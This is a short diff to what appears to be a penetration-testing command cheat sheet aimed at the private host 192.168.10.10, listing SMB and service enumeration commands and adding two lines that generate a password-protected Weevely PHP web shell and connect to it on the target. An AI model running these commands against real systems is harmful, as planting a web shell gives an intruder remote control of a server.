@@ -102,3 +102,5 @@ enum -U 192.168.10.10
 enum -P 192.168.10.10
 enum4linux -a 192.168.10.10
 amap -d 192.168.10.10 4455
+weevely generate 4w3s0m3_w3bsH3l1 agent.php
+weevely http://192.168.10.10/agent.php 4w3s0m3_w3bsH3l1
